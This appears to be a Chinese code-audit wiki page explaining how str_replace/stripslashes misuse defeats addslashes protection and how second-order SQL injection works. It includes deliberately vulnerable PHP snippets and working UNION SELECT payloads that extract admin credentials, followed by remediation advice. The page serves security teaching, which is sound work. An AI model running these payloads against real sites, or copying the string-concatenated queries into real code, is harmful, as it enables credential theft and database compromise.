---
title: 代码审计：二次 SQL 注入成因与完整利用链复现
description: 系统梳理二次 SQL 注入核心成因：入库时转义单引号存储、出库时直接拼接查询导致转义失效。含 str_replace/stripslashes
  误用绕过全局防护、注册-资料修改-后台展示完整利用链复现，基于《代码审计的艺术系列》第三季实战代码溯源。
category: program-analysis
tags:
- 代码审计
- SQL注入
- 二次注入
- 全局防护绕过
- str_replace
- stripslashes
- PHP安全
- 白盒测试
- HackBraid
- 代码审计的艺术系列
date: 2025-01-20
updated: '2026-11-17'
---

## 概述

本页沉淀自「白帽子分享之代码审计的艺术系列」第三季文章，由白帽子 **HackBraid** 撰写，原载「301在路上」微信公众号。重点剖析两类经典代码审计场景：

1. **全局防护绕过**：`str_replace` 与 `stripslashes` 误用消解 `addslashes` 转义，导致一阶 SQL 注入
2. **二次 SQL 注入**：入库时经转义存储、出库时直接拼接查询，转义字符在数据库层面「消失」从而触发注入，形成 **注册 → 资料修改 → 后台展示** 完整利用链

> 前置阅读：[[code-audit-global-protection-blindspots]] 已系统梳理全局防护八大盲点（含整型注入、数组键名注入、SERVER 变量注入、FILES 注入、变量覆盖、字符编码转换绕过、函数误用绕过、二次注入），本页聚焦「函数误用绕过」与「二次注入」两大场景的代码级溯源与实战复现。

---

## 一、函数误用绕过全局防护

### 场景假设

- 应用在入口文件（如 `common.php`）对所有 `GET/POST/COOKIE` 执行 `addslashes` 全局转义
- 业务代码在使用参数前，再次调用 `str_replace` 或 `stripslashes` 处理，导致转义被「洗掉」

### `str_replace` 误用：单引号替换为空

**缺陷代码片段**

```php
<?php
require_once('common.php');          // 全局 addslashes
$conn = mysql_connect('localhost', 'root', 'braid') or die('bad!');
mysql_query("SET NAMES binary");
mysql_select_db('test', $conn) OR emMsg("数据库连接失败");

$tmp_id = isset($_GET['id']) ? $_GET['id'] : 1;
$title  = isset($_GET['title']) ? $_GET['title'] : 'news title';

// 直接用 str_replace 干掉 id 里的单引号
$id = str_replace("'", '', $tmp_id);

$sql = "SELECT * FROM news WHERE id='{$id}' and title='{$title}'";
echo $sql;
$result = mysql_query($sql, $conn) or die(mysql_error());
?>
```

**执行流程溯源**

| 步骤 | 数据变化 | 说明 |
|------|----------|------|
| 1. 用户输入 | `id=-1'` | 原始载荷 |
| 2. `addslashes` | `id=-1\\'` | 单引号被反斜杠转义 |
| 3. `str_replace("'", '', ...)` | `id=-1\` | **单引号被删除，反斜杠保留** |
| 4. 拼入 SQL | `... WHERE id='1\' and title='...'` | 反斜杠转义了 SQL 语句中 id 后的单引号，导致 `title` 参数闭合进入可控区域 |

**实战 Payload**

```
http://localhost/sqltest/streplace.php?id=-1'&title=union select 1,2,concat(name,0x23,pass) from admin%23
```

> 结果：成功在 `title` 位置注入 `UNION SELECT` 拿到管理员账号密码。

### `stripslashes` 误用：直接删除反斜杠

**缺陷代码片段**

```php
<?php
require_once('common.php');
$conn = mysql_connect('localhost', 'root', 'braid') or die('bad!');
mysql_query("SET NAMES binary");
mysql_select_db('test', $conn) OR emMsg("数据库连接失败");

$tmp_id = isset($_GET['id']) ? $_GET['id'] : 1;
// 直接 stripslashes 洗掉反斜杠
$id = stripslashes($tmp_id);

$sql = "SELECT * FROM news WHERE id='{$id}'";
echo $sql.'<br />';
$result = mysql_query($sql, $conn) or die(mysql_error());
?>
```

**执行流程溯源**

| 步骤 | 数据变化 | 说明 |
|------|----------|------|
| 1. 用户输入 | `id=-1'` | 原始载荷 |
| 2. `addslashes` | `id=-1\\'` | 转义 |
| 3. `stripslashes` | `id=-1'` | **反斜杠被删除，单引号恢复** |
| 4. 拼入 SQL | `... WHERE id='-1'...` | 单引号闭合，直接注入 |

**实战 Payload**

```
http://localhost/sqltest/stripslashes.php?id=-1' union select 1,2,concat(name,0x23,pass) from admin%23
```

> 结果：同理拿到管理员凭据。

### 审计要点速查

| 危险函数 | 典型误用场景 | 审计关键字 |
|----------|--------------|------------|
| `str_replace` | 替换单引号、括号等「危险字符」为空，但保留了反斜杠 | `str_replace("'", '', $var)`、`str_replace('\\', '', $var)` |
| `stripslashes` | 直接对已转义变量调用，意图「清理」但实为「还原」 | `stripslashes($var)` |
| `strip_tags` / `htmlspecialchars` | 仅做 HTML 实体编码，未处理 SQL 上下文 | 搜索配合 SQL 拼接的变量 |

> 交叉引用：[[code-audit-global-protection-blindspots#函数误用绕过]]、[[ctfshow-web-sql-injection-bypass-basics]]、[[xd-security-pentest-basic-stage-notes#sql注入]]

---

## 二、二次 SQL 注入：成因、存储机制与完整利用链

### 核心成因

> **入库时**：应用对用户输入执行 `addslashes`（或 `mysql_real_escape_string`）转义单引号为 `\'`，随后执行 `INSERT` 语句。  
> **MySQL 存储行为**：执行 `INSERT` 时，`\'` 被解析为字面量 `'` 存入表中，**反斜杠不落库**。  
> **出库时**：业务代码直接从数据库取出该字段，**未做任何转义/参数化**，直接拼接进新的 `SELECT/UPDATE/DELETE` 语句 → 单引号「复活」 → 注入触发。

### 存储层面演示

假设注册/资料修改时昵称输入 `braid'`：

```sql
-- 应用层转义后执行
INSERT INTO test VALUES (1, 'braid\'', '18', 'run');

-- MySQL 实际存储内容
SELECT * FROM test;
-- 结果：nickname 列值为 braid'  （反斜杠消失）
```

> 截图来源：原文 `f1b69a45d4855de70e91ffd83b509c20.png`

### 完整利用链复现

#### 步骤 1：注册/修改资料植入恶意载荷

| 动作 | 输入字段 | 载荷示例 | 说明 |
|------|----------|----------|------|
| 注册账号 | `nickname` | `braid'` | 单引号经转义入库，落库后变为 `braid'` |
| 或 修改资料 | `nickname` | `admin'--` | 针对后台展示页构造永真条件/注释 |

#### 步骤 2：触发点——后台/前台展示页直接拼接

**典型脆弱代码模式**

```php
// 后台用户列表页
$sql = "SELECT * FROM users WHERE nickname = '{$row['nickname']}'";
// 或
$sql = "UPDATE profiles SET view_count = view_count + 1 WHERE nickname = '{$nickname}'";
```

- `$row['nickname']` 直接来自数据库，**未再次转义**
- 拼接后单引号闭合前层引号，注入生效

#### 步骤 3：实战 Payload 构造

以「获取管理员密码」为例，假设后台展示页 SQL 为：

```sql
SELECT * FROM users WHERE nickname = 'braid''  -- 此处单引号来自数据库
```

构造 `nickname = braid' UNION SELECT 1,2,concat(name,0x23,pass),4 FROM admin-- -`

入库后存为：`braid' UNION SELECT 1,2,concat(name,0x23,pass),4 FROM admin-- -`

出库拼接生成：

```sql
SELECT * FROM users WHERE nickname = 'braid' UNION SELECT 1,2,concat(name,0x23,pass),4 FROM admin-- -'
```

> 成功在展示页回显管理员 `name#pass`。

### 二次注入审计检测清单

| 检测维度 | 关键操作 | 典型代码特征 |
|----------|----------|--------------|
| **入库点** | 找 `INSERT/UPDATE` 使用用户可控字段 | `$_POST['nickname']` → `addslashes` → `INSERT` |
| **存储验证** | 确认转义字符在 DB 中「消失」 | `SELECT HEX(nickname) FROM users` 无 `5c` (反斜杠) |
| **出库点** | 找直接拼接 DB 字段进新 SQL 的位置 | `SELECT ... WHERE col = '{$row['nickname']}'` |
| **可控性** | 入库字段能否由攻击者写入/修改 | 注册、修改资料、评论、收货地址等 |
| **回显/盲注** | 出库点是否有数据回显、报错、时间差 | 列表页、详情页、导出 CSV、API 响应 |

> 交叉引用：[[code-audit-global-protection-blindspots#二次注入]]、[[mysql-duplicate-entry-error-based-sqli]]、[[sqlmap-comprehensive-guide]]、[[xd-security-code-audit-notes-day50-57]]

---

## 三、防御与修复指南

### 根治方案：全链路参数化查询

```php
// 入库
$stmt = $pdo->prepare("INSERT INTO users (nickname, age, hobby) VALUES (?, ?, ?)");
$stmt->execute([$nickname, $age, $hobby]);

// 出库 —— 任何从 DB 取出再入 SQL 的场景，也必须参数化
$stmt = $pdo->prepare("SELECT * FROM logs WHERE nickname = ?");
$stmt->execute([$row['nickname']]);  // $row 来自 DB，依然走占位符
```

> **原则**：**永远不要**将任何外部来源（包括数据库读出的数据）直接拼接进 SQL 字符串。

### 修复误用函数场景

| 误用模式 | 修正做法 |
|----------|----------|
| `str_replace("'", '', $var)` 后拼 SQL | 删除该行，改用预处理语句 |
| `stripslashes($var)` 后拼 SQL | 删除该行，改用预处理语句 |
| 手工 `addslashes` + 拼接 | 统一迁移至 PDO/MySQLi 预处理 |

### 深度防御补充

1. **最小权限数据库账号**：Web 应用仅授予 `SELECT/INSERT/UPDATE/DELETE`，禁 `DROP/ALTER/FILE` 等高危权限
2. **WAF/应用层规则**：拦截 `UNION SELECT`、`--`、`/*` 等典型注入特征（仅作缓解，不可替代参数化）
3. **代码审计纳入 CI**：集成静态分析工具（如 PHPStan、Psalm、RIPS）扫描字符串拼接 SQL 模式
4. **日志审计**：记录所有失败的 SQL 执行、异常报错，配合 [[xd-security-incident-response-notes]] 做溯源

---

## 四、关联知识体系速览

| 专题页面 | 核心关联点 |
|----------|------------|
| [[code-audit-global-protection-blindspots]] | 全局防护八大盲点系统梳理，含本页两大场景的分类定位 |
| [[code-audit-file-operation-vulnerabilities]] | 文件操作漏洞审计方法论，同属白盒审计核心技能树 |
| [[ctfshow-web-sql-injection-bypass-basics]] | CTF 实战中同类绕过技巧（intval、正则、进制、堆叠注入等） |
| [[xd-security-pentest-basic-stage-notes]] | XD安全渗透测试课程基础阶段 SQL 注入模块，含二次注入实战笔记 |
| [[sqlmap-comprehensive-guide]] | 自动化验证二次注入点的工具化用法（`--second-order` 等高级参数） |
| [[mysql-dnslog-injection-loadfile-unc]] | 无回显场景下二次注入的 DNSLog 外带数据技术 |

---

## 五、附录：原文测试环境与资源

- **测试代码 & SQL**：原文百度网盘 `http://pan.baidu.com/s/1i54Oq25` 密码 `bmu2`
- **环境**：WAMP（Windows + Apache + MySQL + PHP）、Notepad++
- **前置技能**：PHP 基础、MySQL 入门

> 系列文章导航：  
> 1. [[代码审计的艺术系列—第一篇]]（原文链接失效，建议搜索标题）  
> 2. [[白帽子分享之代码的艺术系列—第二篇]]（原文链接失效）  
> 3. **本页（第三季）：函数误用绕过 + 二次注入完整链**  
> 4. 后续季度请关注「301在路上」或 HackBraid 个人输出

---

## 变更记录

| 日期 | 版本 | 变更说明 |
|------|------|----------|
| 2025-01-20 | 1.0 | 初始创建：结构化沉淀第三季核心技术点，建立交叉引用网络 |

## 来源

- [301在路上-201508-202208_145](../sources/301在路上-201508-202208_145.md)
